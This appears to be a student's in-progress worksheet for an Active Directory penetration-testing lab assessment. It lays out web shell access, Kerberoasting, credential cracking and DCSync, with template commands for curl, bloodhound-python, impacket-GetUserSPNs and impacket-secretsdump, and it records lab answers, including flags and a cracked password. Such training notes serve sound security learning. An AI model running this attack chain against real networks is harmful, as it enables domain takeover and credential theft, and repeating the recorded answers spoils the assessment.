# Skills Assessment

## Context
> A team member started an External Penetration Test and was moved to another urgent project before they could finish. They found and exploited a file upload vulnerability on an externally-facing web server and left a password-protected web shell in place for us to continue. We need to leverage the web shell to gain an initial foothold in the internal network, enumerate the Active Directory environment, find flaws and misconfigurations to move laterally, and ultimately achieve domain compromise.

## Objectives
- [ ] Access the web shell at /uploads
- [ ] Gain foothold on the web server
- [ ] Enumerate AD environment
- [ ] Kerberoast an account with SPN MSSQLSvc/SQL01.inlanefreight.local:1433
- [ ] Crack the kerberoasted password
- [ ] Find cleartext credentials for another domain user
- [ ] Identify and perform privilege escalation attack
- [ ] Take over the domain (DC01)
- [ ] Capture all flags along the way

## Starting Point
- **External Access:** Web shell at `10.129.77.54/uploads`
- **Web Shell Credentials:** `admin:My_W3bsH3ll_P@ssw0rd!`
- **Target Environment:** Inlanefreight Active Directory
- **Goal:** Domain compromise

## Questions

| # | Question | Answer | Status |
|---|----------|--------|--------|
| 1 | Submit the contents of flag.txt on Administrator Desktop of web server | `JusT_g3tt1ng_st@rt3d!` | ⏳ |
| 2 | Kerberoast an account with SPN MSSQLSvc/SQL01.inlanefreight.local:1433 — submit account name | `svc_sql` | ⏳ |
| 3 | Crack the account's password — submit cleartext | `lucky7` | ⏳ |
| 4 | Submit flag.txt on Administrator desktop on MS01 | | ⏳ |
| 5 | Find cleartext credentials for another domain user — submit username | | ⏳ |
| 6 | Submit this user's cleartext password | | ⏳ |
| 7 | What attack can this user perform? | | ⏳ |
| 8 | Take over the domain — submit flag.txt on Administrator Desktop on DC01 | | ⏳ |

## Target Map

```
[External]
    |
    v
[10.129.77.54] ← Web Shell (/uploads, admin:My_W3bsH3ll_P@ssw0rd!)
    |
    v
[Web Server] — Initial foothold
    |
    v
[AD Environment] — Enumeration target
    |
    v
[DC01] — Domain Controller / Final target
```

## Recon

### Web Shell Access
- **URL:** `http://10.129.77.54/uploads/`
- **Credentials:** `admin:My_W3bsH3ll_P@ssw0rd!`
- **Type:** Password-protected web shell

### Tools to Try
- `whoami` — current user context
- `ipconfig` — network interfaces
- `net user` / `net localgroup administrators` — local accounts
- `nltest /domain_trusts` — domain info
- `bloodhound-python` / `SharpHound.exe` — AD enumeration
- `impacket` scripts — Kerberoasting, DCSync

## Exploitation Plan

### Phase 1: Web Shell Access & Initial Foothold
```bash
# Access web shell
curl "http://10.129.77.54/uploads/" -u admin:My_W3bsH3ll_P@ssw0rd!
```

### Phase 2: Web Server Enumeration
```cmd
whoami
ipconfig /all
net user
type C:\Users\Administrator\Desktop\flag.txt
```

### Phase 3: AD Enumeration
```bash
# From attack box (with tunnel):
bloodhound-python -u <user> -p <pass> -d inlanefreight.local -dc DC01.inlanefreight.local -c All

# Or use SharpHound from web shell
```

### Phase 4: Kerberoasting
```bash
# GetUserSPNs.py
impacket-GetUserSPNs inlanefreight.local/<user>:<pass> -dc-ip <DC_IP>

# Crack with hashcat/John
```

### Phase 5: Domain Compromise
```bash
# DCSync, Golden Ticket, or other domain admin attack
impacket-secretsdump inlanefreight.local/<DA>:<pass>@DC01.inlanefreight.local
```

## Flags
| Host | Location | Flag | Status |
|------|----------|------|--------|
| Web Server | Administrator Desktop | | ⏳ Pending |
| MS01 | Administrator Desktop | | ⏳ Pending |
| DC01 | Administrator Desktop | | ⏳ Pending |

## Credentials Discovered
| Account | Password | Source | Valid On |
|---------|----------|--------|----------|
| admin | My_W3bsH3ll_P@ssw0rd! | Given (web shell) | Web shell |

## Pivot Map
```
[External Attacker]
    |
    | HTTP → Web Shell
    v
[10.129.77.54] — Web Server
    |
    | ??? (tunnel/pivot)
    v
[AD Internal Network]
    |
    | Enumeration → Kerberoasting → Privilege Escalation
    v
[DC01] — Domain Controller
```

## Lessons Learned
- TBD

---

*Started: 2026-04-24*
*Status: 🔄 IN PROGRESS — Web shell access starting*
